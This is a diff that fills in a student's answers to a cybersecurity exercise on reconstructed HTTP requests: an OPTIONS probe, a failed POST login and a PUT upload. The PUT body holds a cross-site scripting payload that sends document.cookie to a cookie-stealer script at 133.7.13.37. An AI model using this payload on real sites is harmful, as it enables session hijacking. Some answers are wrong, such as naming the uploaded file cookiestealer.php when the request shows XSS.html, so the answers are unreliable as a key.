@@ -30,11 +30,11 @@ Review the partially reconstructed HTTP requests and responses. Answer the quest
      Allow: OPTIONS, GET, POST, HEAD, PUT
      ```
 
-   - **Question:** What kind of request was used here that would cause an HTTP server to tell the client all of the HTTP request methods it will respond to?
+   - **Question:** What kind of request was used here that would cause an HTTP server to tell the client all of the HTTP request methods it will respond to?  **OPTIONS**
 
-   - **Analysis:** Do you think this HTTP request method can be used by an attacker to gather information about an HTTP server? Why or why not?
+   - **Analysis:** Do you think this HTTP request method can be used by an attacker to gather information about an HTTP server? Why or why not?  **yes, this will let attacker know what the possibilities are**
 
-2. The system admins reported some corrupted HTTP traffic that occurred before the following recovered response:
+2. The system admins reported some corrupted HTTP traffic that occurred before the following recovered response: 
 
    **HTTP Response 2**
 
@@ -56,11 +56,11 @@ Review the partially reconstructed HTTP requests and responses. Answer the quest
      ```
 
    - **Questions:** 
-      - What status code was returned in this response?
-      - According to the response body, what kind of method was used to generate this HTTP response?
-     - What sort of information was input to this HTTP request?
+      - What status code was returned in this response?  **401**
+      - According to the response body, what kind of method was used to generate this HTTP response? **POST**
+     - What sort of information was input to this HTTP request?  **hidden, user, pwd**
 
-   - **Analysis:** Based on the information gathered from the status code and response body, what did the attacker try to do? Were they successful? 
+   - **Analysis:** Based on the information gathered from the status code and response body, what did the attacker try to do? Were they successful?  **the attacker was unable to login**
 
 3. The following HTTP request and response were also recovered:
 
@@ -70,7 +70,7 @@ Review the partially reconstructed HTTP requests and responses. Answer the quest
      PUT /XSS.html HTTP/1.1
      User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
      Host: www.fakesite.com/blog
-
+   
      <script type="text/javascript">
      document.location='http://133.7.13.37/cookiestealer.php?c='+document.cookie;
      </script>
@@ -88,12 +88,12 @@ Review the partially reconstructed HTTP requests and responses. Answer the quest
      ```
 
    - **Questions:** 
-      - What type of method was used in the request?
-      - What file name was uploaded to the site, according to the request body?
+      - What type of method was used in the request?  **PUT**
+      - What file name was uploaded to the site, according to the request body?  **cookiestealer.php**
 
    - **Analysis:** 
-      - Based on the request method and request body, what do you think happened here? 
-      - How did the server respond?
+      - Based on the request method and request body, what do you think happened here? **clode loaded**
+      - How did the server respond?  **201**
 
 4. The next partial request and header was received by our HTTP server. The data after this log was completely lost:
 
